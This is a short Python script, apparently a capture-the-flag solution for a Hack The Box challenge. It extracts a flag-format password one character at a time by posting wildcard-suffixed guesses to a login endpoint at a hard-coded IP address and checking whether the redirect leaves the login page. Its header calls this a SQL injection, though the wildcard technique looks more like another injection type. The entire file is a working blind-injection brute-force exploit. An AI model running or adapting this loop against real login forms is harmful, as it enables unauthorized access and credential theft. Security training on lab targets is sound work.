/// python code for cracking a sql injection with bruteforce one by one ///


import requests

letters = [chr(i) for i in range(48, 127)]
password = "HTB{"

URL = "http://206.189.121.131:32199/login"

def check(p):
    r = requests.post(URL, data={"username": "Reese", "password": p})
    if "login" not in r.url:
        print("Success...", p)
        return True
    else:
        return False


while password[-1] != "}":
    for i in letters:
        p = password + i + "*"
        print("Trying...", p)
        if check(p):
            password += i
            break
